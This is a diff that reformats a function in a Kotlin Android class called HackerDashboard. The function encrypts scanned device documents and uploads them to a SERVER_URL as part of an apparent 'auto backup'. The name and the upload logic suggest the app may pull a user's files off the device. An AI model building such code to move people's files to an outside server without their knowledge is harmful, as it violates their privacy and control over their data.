@@ -167,13 +167,17 @@ class HackerDashboard : AppCompatActivity() {
     }
 
     private suspend fun processFile(
-        doc: ScannedDocument,
-        key: ByteArray,
-        index: Int,
-        total: Int
-    ): String = try {
+    doc: ScannedDocument,
+    key: ByteArray,
+    index: Int,
+    total: Int
+): String {
 
-        val temp = FileUtil.copyToTemp(this, doc.uri) ?: return "FAILED"
+    return try {
+
+        val temp = FileUtil.copyToTemp(this, doc.uri)
+            ?: return "FAILED"
+
         val enc = File(temp.parent, temp.name + ".enc")
 
         CryptoUtil.encrypt(temp, enc, key)
@@ -183,22 +187,33 @@ class HackerDashboard : AppCompatActivity() {
         val old = HashManager.get(this, doc.uri.toString())
 
         if (hash == old) {
+
             enc.delete()
             log("⏭ Skipped: ${doc.name}")
+
             return "SKIPPED"
         }
 
         val uploaded = Uploader.uploadFile(SERVER_URL, enc)
+
         if (uploaded) {
+
             HashManager.save(this, doc.uri.toString(), hash)
             log("✅ Uploaded: ${doc.name}")
+
             "SUCCESS"
-        } else "FAILED"
+
+        } else {
+
+            "FAILED"
+        }
 
     } catch (e: Exception) {
+
         log("❌ ${doc.name}: ${e.message}")
         "FAILED"
     }
+}
 
     // ================= PHASE-2 =================
     private fun startAutoBackup() {
